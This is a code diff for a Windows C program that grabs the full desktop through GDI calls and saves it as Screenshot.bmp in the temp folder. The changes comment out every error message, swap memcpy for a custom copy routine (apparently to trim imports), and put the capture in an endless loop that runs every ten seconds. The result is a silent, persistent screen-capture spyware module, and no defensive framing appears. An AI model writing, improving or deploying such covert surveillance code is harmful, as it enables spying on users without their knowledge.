@@ -4,6 +4,17 @@
 
 #pragma comment(lib, "Shlwapi.lib")
 
+PVOID CopyMemoryEx(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
+{
+	PBYTE D = (PBYTE)Destination;
+	PBYTE S = (PBYTE)Source;
+
+	while (Length--)
+		*D++ = *S++;
+
+	return Destination;
+}
+
 #define U_PTR( x ) (UINT_PTR) x
 #define C_PTR( x ) (PVOID) x
 
@@ -18,15 +29,15 @@ BOOL WriteFileToDiskW( IN LPCWSTR cFileName, IN PBYTE pFileBuffer, OUT DWORD dwF
 	if ( ( hFile = CreateFileW( cFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS,
 	                            FILE_ATTRIBUTE_NORMAL, NULL ) ) == INVALID_HANDLE_VALUE )
 	{
-		printf( "[!] CreateFileA Failed With Error: %d \n", GetLastError() );
+		//printf( "[!] CreateFileA Failed With Error: %d \n", GetLastError() );
 		goto _END_OF_FUNC;
 	}
 
 	if ( !WriteFile( hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL ) || dwFileSize !=
 		dwNumberOfBytesWritten )
 	{
-		printf( "[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(),
-		        dwNumberOfBytesWritten, dwFileSize );
+		//printf( "[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(),
+		        //dwNumberOfBytesWritten, dwFileSize );
 	}
 
 _END_OF_FUNC:
@@ -73,20 +84,20 @@ BOOL ScreenshotBmp(
 	DeviceCtx = GetDC( NULL );
 	if ( !DeviceCtx )
 	{
-		printf( "[-] GetDC Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] GetDC Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
 	GdiCurrent = GetCurrentObject( DeviceCtx, OBJ_BITMAP );
 	if ( !GdiCurrent )
 	{
-		printf( "[-] GetCurrentObject Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] GetCurrentObject Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
 	if ( !GetObjectW( GdiCurrent, sizeof( BITMAP ), &Desktop ) )
 	{
-		printf( "[-] GetObjectW Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] GetObjectW Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
@@ -118,7 +129,7 @@ BOOL ScreenshotBmp(
 
 	if ( *Buffer == NULL )
 	{
-		printf( "[-] HeapAlloc Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] HeapAlloc Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
@@ -128,7 +139,7 @@ BOOL ScreenshotBmp(
 	MemDeviceCtx = CreateCompatibleDC( DeviceCtx );
 	if ( !MemDeviceCtx )
 	{
-		printf( "[-] CreateCompatibleDC Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] CreateCompatibleDC Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
@@ -137,20 +148,20 @@ BOOL ScreenshotBmp(
 	BitMapSection = CreateDIBSection( DeviceCtx, &BmpInfo, DIB_RGB_COLORS, &BitsBuf, NULL, 0 );
 	if ( !BitMapSection && !BitsBuf )
 	{
-		printf( "[-] CreateDIBSection Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] CreateDIBSection Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
 	GdiObject = SelectObject( MemDeviceCtx, BitMapSection );
 	if ( !GdiObject )
 	{
-		printf( "[-] SelectObject Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] SelectObject Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
 	if ( !BitBlt( MemDeviceCtx, 0, 0, Desktop.bmWidth, Desktop.bmHeight, DeviceCtx, VirtualX, VirtualY, SRCCOPY ) )
 	{
-		printf( "[-] BitBlt Failed with Error: %lx\n", GetLastError() );
+		//printf( "[-] BitBlt Failed with Error: %lx\n", GetLastError() );
 		goto LEAVE;
 	}
 
@@ -158,9 +169,9 @@ BOOL ScreenshotBmp(
 	// constructing the BMP File in the allocated
 	// memory buffer including the file and information
 	// headers and image bits 
-	memcpy( *Buffer, &BmpFileHeader, sizeof( BmpFileHeader ) );
-	memcpy( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) ), &BmpInfoHeader, sizeof( BmpInfoHeader ) );
-	memcpy( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) + U_PTR( sizeof( BmpInfoHeader ) ) ), BitsBuf,
+	CopyMemoryEx( *Buffer, &BmpFileHeader, sizeof( BmpFileHeader ) );
+	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) ), &BmpInfoHeader, sizeof( BmpInfoHeader ) );
+	CopyMemoryEx( ( ( PBYTE )( *Buffer ) + U_PTR( sizeof( BmpFileHeader ) ) + U_PTR( sizeof( BmpInfoHeader ) ) ), BitsBuf,
 	        BitsLen );
 
 	Success = TRUE;
@@ -210,18 +221,24 @@ int main( void )
 
 	StrCatW( lpTempDir, L"Screenshot.bmp" );
 
-	if ( !ScreenshotBmp( &pBuffer, &uLong ) )
-	{
-		return -1;
-	}
+	while (TRUE) {
 
-	if ( !WriteFileToDiskW( lpTempDir, pBuffer, uLong ) )
-	{
-		return -1;
-	}
 
-	RtlSecureZeroMemory( pBuffer, uLong );
-	HeapFree( GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer );
+		if (!ScreenshotBmp(&pBuffer, &uLong))
+		{
+			return -1;
+		}
+
+		if (!WriteFileToDiskW(lpTempDir, pBuffer, uLong))
+		{
+			return -1;
+		}
+
+		RtlSecureZeroMemory(pBuffer, uLong);
+		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer);
+
+		Sleep(10000);
+	}
 
 	return 0;
 }
